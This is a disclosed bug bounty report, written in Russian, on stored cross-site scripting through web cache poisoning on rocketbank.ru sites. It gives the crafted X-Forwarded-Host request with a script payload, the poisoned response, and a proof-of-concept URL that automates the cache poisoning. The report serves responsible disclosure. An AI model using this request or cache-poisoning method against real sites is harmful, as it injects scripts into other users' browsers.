@@ -1,0 +1,37 @@
+ReportLink:https://hackerone.com/reports/415168
+WeaknessName:Cross-site Scripting (XSS) - Stored
+Reporter:https://hackerone.com/bobrov
+ReportedTo:QIWI(qiwi)
+BountyAmount:200.0
+Severity:high
+State:Closed
+DateOfDisclosure:18.11.2018 7:06:05
+
+Summary:
+Практически все сайты *.rocketbank.ru, основанные на readymag.rocketbank.ru, уязвимы к Web Cache Deception и XSS.
+
+Пример запроса:
+```http
+GET /?xx HTTP/1.1
+Host: wknd.rocketbank.ru
+X-Forwarded-Host: cacheattack'"><script>alert(document.domain)</script>
+```
+HTTP ответ:
+```html
+         <link rel="next" href="http://cacheattack'"><script>alert(document.domain)</script>/friends/"> 
+         <link rel="canonical" href="http://cacheattack'"><script>alert(document.domain)</script>/">  
+
+
+
+     <meta content="203852619785949" property="fb:app_id" >
+     <meta content="website" property="og:type" >
+     <meta content="http://cacheattack'"><script>alert(document.domain)</script>/" property="og:url" >
+```
+Данный HTTP ответ попадает в кэш веб сервера и доступен без заголовка X-Forwarded-Host
+
+PoC
+Скрипт для автоматического заражения кэша запросом, с текущими HTTP заголовками.
+Иногда необходимо несколько раз обновить зараженную страницу.
+```
+https://blackfan.ru/bugbounty/webcachedeception.php?url=https://wknd.rocketbank.ru/?cacheattack4&payload=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E```
+
